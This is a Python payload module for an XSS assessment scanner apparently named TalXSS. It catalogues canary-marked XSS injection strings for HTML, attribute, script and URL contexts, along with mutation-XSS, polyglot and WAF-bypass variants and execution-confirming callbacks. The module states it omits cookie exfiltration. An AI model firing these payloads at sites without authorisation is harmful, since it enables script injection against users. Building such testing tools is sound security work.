"""Payload library for TalXSS.

Every test payload carries:
  * a unique per-scan canary token (low false-positive reflection detection),
  * a `context` tag so a payload is only fired where it could plausibly work,
  * an `attack_type` tag so an operator can manually select which classes of
    attack to run (reflected / stored / cookie / dom / polyglot / waf-bypass).

ETHICS: payloads are benign proof-of-concept markers. The `cookie` category
*demonstrates* that `document.cookie` is reachable from an injected context
(the impact a report must prove) using a local alert/void — it does NOT
exfiltrate cookies to any remote server. Building a cookie-collection endpoint
would turn this from an assessment tool into a data-theft weapon, so it is
deliberately omitted.
"""

from __future__ import annotations

import secrets
from pathlib import Path
from dataclasses import dataclass, field

# Folder that holds the operator's curated .txt payload lists.
PAYLOAD_LIST_DIR = Path(__file__).resolve().parent / "payload_lists"

# Known attack types an operator can select from.
ATTACK_TYPES = ["reflected", "stored", "cookie", "dom", "polyglot", "waf-bypass",
                "wordlist", "header", "mxss"]


def new_canary() -> str:
    """A per-scan random token used to detect reflection with low false positives."""
    return "talxss" + secrets.token_hex(4)


@dataclass
class Payload:
    name: str
    template: str
    context: str          # html, attr_double, attr_single, script, url, any
    attack_type: str      # see ATTACK_TYPES
    severity: str = "high"
    note: str = ""
    _rendered: str = field(default="", init=False, repr=False)
    _confirm: str = field(default="", init=False, repr=False)

    def render(self, canary: str) -> "Payload":
        p = Payload(self.name, self.template, self.context, self.attack_type,
                    self.severity, self.note)
        p._rendered = self.template.replace("{C}", canary)
        p._confirm = p._rendered
        return p

    @property
    def value(self) -> str:
        return self._rendered

    @property
    def confirm(self) -> str:
        return self._confirm


def probe_payload(canary: str) -> str:
    """Pure canary + special chars: tells us IF and WHERE input reflects."""
    return f"{canary}'\"<{canary}>"


_LIBRARY: list[Payload] = [
    # ---------------- reflected: HTML body ----------------
    Payload("html-script-tag", "<script>/*{C}*/</script>", "html", "reflected", "high",
            "Raw <script> injected into HTML body."),
    Payload("html-img-onerror", "<img src=x onerror=/*{C}*/>", "html", "reflected", "high",
            "Event handler on injected element."),
    Payload("html-svg-onload", "<svg onload=/*{C}*/>", "html", "reflected", "high",
            "SVG onload breakout."),
    Payload("html-details-ontoggle", "<details open ontoggle=/*{C}*/>", "html", "reflected", "medium"),

    # ---------------- reflected: attribute contexts ----------------
    Payload("attr-dq-breakout", "\"><img src=x onerror=/*{C}*/>", "attr_double", "reflected", "high",
            "Closes a double-quoted attribute and injects an element."),
    Payload("attr-dq-event", "\" onmouseover=/*{C}*/ x=\"", "attr_double", "reflected", "medium"),
    Payload("attr-dq-autofocus", "\" autofocus onfocus=/*{C}*/ x=\"", "attr_double", "reflected", "high"),
    Payload("attr-sq-breakout", "'><img src=x onerror=/*{C}*/>", "attr_single", "reflected", "high"),
    Payload("attr-sq-event", "' onmouseover=/*{C}*/ x='", "attr_single", "reflected", "medium"),

    # ---------------- reflected: inline <script> / JS string ----------------
    Payload("js-string-break", "';/*{C}*/;'", "script", "reflected", "high",
            "Breaks out of a single-quoted JS string."),
    Payload("js-dqstring-break", "\";/*{C}*/;\"", "script", "reflected", "high",
            "Breaks out of a double-quoted JS string."),
    Payload("js-close-script", "</script><script>/*{C}*/</script>", "script", "reflected", "high",
            "Terminates the inline script element entirely."),

    # ---------------- more HTML5 event-handler tags (PayloadsAllTheThings) ----------------
    Payload("html5-input-autofocus", "<input autofocus onfocus=/*{C}*/>", "html", "reflected", "high",
            "autofocus fires onfocus with no user interaction."),
    Payload("html5-select-autofocus", "<select autofocus onfocus=/*{C}*/><option>", "html", "reflected", "medium"),
    Payload("html5-textarea-autofocus", "<textarea autofocus onfocus=/*{C}*/>", "html", "reflected", "medium"),
    Payload("html5-body-onpageshow", "<body onpageshow=/*{C}*/>", "html", "reflected", "medium"),
    Payload("html5-video-source", "<video><source onerror=/*{C}*/></video>", "html", "reflected", "medium"),
    Payload("html5-marquee-onstart", "<marquee onstart=/*{C}*/>", "html", "reflected", "low"),

    # ---------------- SVG vectors (PayloadsAllTheThings) ----------------
    Payload("svg-script", "<svg><script>/*{C}*/</script></svg>", "html", "reflected", "high",
            "Script element inside SVG."),
    Payload("svg-animate-onbegin", "<svg><animate onbegin=/*{C}*/ attributeName=x dur=1s>", "html", "reflected", "medium"),
    Payload("svg-set-onbegin", "<svg><set attributeName=x onbegin=/*{C}*/>", "html", "reflected", "medium"),

    # ---------------- URI wrappers: data: / vbscript: (PayloadsAllTheThings) ----------------
    Payload("url-data-html", "data:text/html,<script>/*{C}*/</script>", "url", "reflected", "medium",
            "data: URI delivering HTML/JS in a navigational sink."),
    Payload("url-vbscript", "vbscript:/*{C}*/", "url", "reflected", "low",
            "Legacy vbscript: URI (old IE)."),

    # ---------------- Markdown / CSS / XML sinks (PayloadsAllTheThings) ----------------
    Payload("md-js-link", "[x](javascript:/*{C}*/)", "any", "reflected", "medium",
            "Markdown link whose href becomes a javascript: URI when rendered."),
    Payload("css-style-break", "</style><script>/*{C}*/</script>", "html", "reflected", "high",
            "Breaks out of a <style> block back into HTML."),
    Payload("xml-xhtml-script", "<script xmlns=\"http://www.w3.org/1999/xhtml\">/*{C}*/</script>",
            "html", "reflected", "medium", "Script in the XHTML namespace (XML/XHTML sinks)."),

    # ---------------- mutation XSS (mXSS) — browser re-parsing turns sanitized markup live ----
    Payload("mxss-noscript", "<noscript><p title=\"</noscript><img src=x onerror=/*{C}*/>\">",
            "html", "mxss", "high", "noscript mutation (DOMPurify-style); confirm in a browser."),
    Payload("mxss-style-a", "<svg></p><style><a id=\"</style><img src=1 onerror=/*{C}*/>\">",
            "html", "mxss", "high", "style/anchor re-parse mutation."),
    Payload("mxss-listing", "<listing>&lt;img src=1 onerror=/*{C}*/&gt;</listing>",
            "html", "mxss", "medium", "listing element entity re-interpretation."),

    # ---------------- url / href / src context ----------------
    Payload("url-javascript", "javascript:/*{C}*/", "url", "reflected", "medium",
            "javascript: URI in a link/src sink."),

    # ---------------- stored: same breakouts, flagged for the stored pass ----------------
    Payload("stored-img-onerror", "<img src=x onerror=/*{C}*/>", "html", "stored", "high",
            "Persisted element+handler; confirmed if it resurfaces on another page."),
    Payload("stored-svg-onload", "<svg onload=/*{C}*/>", "html", "stored", "high",
            "Persisted SVG onload."),

    # ---------------- cookie-impact PoC (benign: no exfiltration) ----------------
    Payload("cookie-access-img", "<img src=x onerror=\"/*{C}*/void(document.cookie)\">",
            "html", "cookie", "high",
            "Demonstrates document.cookie is reachable from injected script (no data sent anywhere)."),
    Payload("cookie-access-svg", "<svg onload=\"/*{C}*/void(document.cookie)\">",
            "html", "cookie", "high",
            "Cookie-access PoC via SVG onload (local, non-exfiltrating)."),

    # ---------------- dom-ish markers ----------------
    Payload("dom-hash-marker", "<img src=x onerror=/*{C}*/>", "html", "dom", "medium",
            "Marker for sinks that reflect fragment/hash into the DOM."),

    # ---------------- polyglot ----------------
    Payload("polyglot-xss",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=/*{C}*/)//",
            "any", "polyglot", "high",
            "Single polyglot that fires across several contexts (Gareth Heyes style)."),

    # ---------------- waf-bypass / obfuscation ----------------
    Payload("waf-mixed-case", "<ImG sRc=x OnErRoR=/*{C}*/>", "html", "waf-bypass", "high",
            "Mixed-case tag/attribute to slip naive keyword filters."),
    Payload("waf-nested-tag", "<scr<script>ipt>/*{C}*/</scr</script>ipt>", "html", "waf-bypass", "medium",
            "Nested tag that re-forms after a non-recursive strip."),
    Payload("waf-backtick-event", "<img src=x onerror=`/*{C}*/`>", "html", "waf-bypass", "medium",
            "Backtick-delimited handler body."),
]


def _rendered(payloads: list[Payload], canary: str) -> list[Payload]:
    return [p.render(canary) for p in payloads]


def library_for_context(context: str, canary: str,
                        attack_types: list[str] | None = None) -> list[Payload]:
    """Rendered payloads matching a reflection context AND the selected attack types.

    `attack_types=None` means all types. The stored pass is driven separately,
    but stored payloads are still fired inline so they can be detected if the
    same page reflects them immediately too.
    """
    types = set(attack_types) if attack_types else set(ATTACK_TYPES)
    selected = [p for p in _LIBRARY
                if (p.context == context or context == "any" or p.context == "any")
                and p.attack_type in types]
    if not selected:
        selected = [p for p in _LIBRARY if p.context == "html" and p.attack_type in types]
    return _rendered(selected, canary)


def stored_payloads(canary: str, attack_types: list[str] | None = None) -> list[Payload]:
    """Payloads whose presence on a *different* page later proves stored XSS."""
    types = set(attack_types) if attack_types else set(ATTACK_TYPES)
    if "stored" not in types:
        return []
    return _rendered([p for p in _LIBRARY if p.attack_type == "stored"], canary)


def all_payloads(canary: str) -> list[Payload]:
    return _rendered(_LIBRARY, canary)


# --------------------------------------------------------------------------- #
# Execution-proof payloads: each calls window.__talxss('<canary>') so the
# headless verifier can confirm the JavaScript actually RAN (not just reflected).
# They also fall back to alert('<canary>') for sinks where our hook is absent.
# --------------------------------------------------------------------------- #
# Each callback appends document.domain so the verifier can report WHICH origin
# executed the payload (PayloadsAllTheThings recommends document.domain/origin
# over alert(1), especially inside sandbox domains). The canary stays the prefix.
_EXEC: list[Payload] = [
    Payload("exec-script", "<script>window.__talxss('{C}|'+document.domain)</script>", "html", "reflected", "high"),
    Payload("exec-img-onerror", "<img src=x onerror=\"window.__talxss('{C}|'+document.domain)\">", "html", "reflected", "high"),
    Payload("exec-svg-onload", "<svg onload=\"window.__talxss('{C}|'+document.domain)\">", "html", "reflected", "high"),
    Payload("exec-svg-script", "<svg><script>window.__talxss('{C}|'+document.domain)</script></svg>", "html", "reflected", "high"),
    Payload("exec-body-onpageshow", "<body onpageshow=\"window.__talxss('{C}|'+document.domain)\">", "html", "reflected", "medium"),
    Payload("exec-input-autofocus", "<input autofocus onfocus=\"window.__talxss('{C}|'+document.domain)\">", "html", "reflected", "high"),
    Payload("exec-attr-dq", "\"><img src=x onerror=\"window.__talxss('{C}|'+document.domain)\">", "attr_double", "reflected", "high"),
    Payload("exec-attr-sq", "'><img src=x onerror='window.__talxss(\"{C}|\"+document.domain)'>", "attr_single", "reflected", "high"),
    Payload("exec-js-break", "';window.__talxss('{C}|'+document.domain);'", "script", "reflected", "high"),
    Payload("exec-js-dqbreak", "\";window.__talxss('{C}|'+document.domain);\"", "script", "reflected", "high"),
    Payload("exec-close-script", "</script><script>window.__talxss('{C}|'+document.domain)</script>", "script", "reflected", "high"),
    Payload("exec-cookie", "<img src=x onerror=\"window.__talxss('{C}|cookie-readable')\">",
            "html", "cookie", "high", "Proves injected JS runs where document.cookie is reachable (nothing is sent anywhere)."),
]


def exec_payloads(canary: str, context: str = "any") -> list[Payload]:
    """Payloads that CALL back with the canary, for headless execution checks."""
    sel = [p for p in _EXEC if context in ("any", p.context) or p.context == "any"]
    if not sel:
        sel = [p for p in _EXEC if p.context == "html"]
    return _rendered(sel, canary)


# --------------------------------------------------------------------------- #
# Wordlist source: the operator's curated .txt lists in payload_lists/
# --------------------------------------------------------------------------- #
def available_wordlists() -> list[str]:
    if not PAYLOAD_LIST_DIR.is_dir():
        return []
    return sorted(p.name for p in PAYLOAD_LIST_DIR.glob("*.txt"))


def load_wordlist_payloads(canary: str, files: list[str] | None = None,
                           max_count: int = 250) -> list[Payload]:
    """Turn lines from the curated .txt lists into TalXSS payloads.

    Each raw line is fired as-is with a canary marker appended, so a finding
    means the point reflected our injected markup UNESCAPED and the raw line is
    the suggested exploit string. Capped by `max_count` to stay a polite
    assessment tool rather than a flood; `files=None` uses every list.
    """
    if not PAYLOAD_LIST_DIR.is_dir():
        return []
    chosen = files or available_wordlists()
    out: list[Payload] = []
    seen: set[str] = set()
    marker = f"<{canary}>"  # unique, HTML-significant anchor for confirmation
    for fname in chosen:
        fp = PAYLOAD_LIST_DIR / fname
        if not fp.is_file():
            continue
        try:
            lines = fp.read_text(encoding="utf-8", errors="ignore").splitlines()
        except OSError:
            continue
        for raw in lines:
            raw = raw.strip()
            if not raw or raw.startswith("#") or raw in seen:
                continue
            seen.add(raw)
            p = Payload(name=f"wordlist:{fname}", template="", context="any",
                        attack_type="wordlist", severity="medium",
                        note=f"Raw payload from {fname}; reflected unescaped (verify in a browser).")
            # Fire the real line plus a unique canary anchor we can confirm on.
            p._rendered = f"{raw} {marker}"
            p._confirm = marker
            out.append(p)
            if len(out) >= max_count:
                return out
    return out
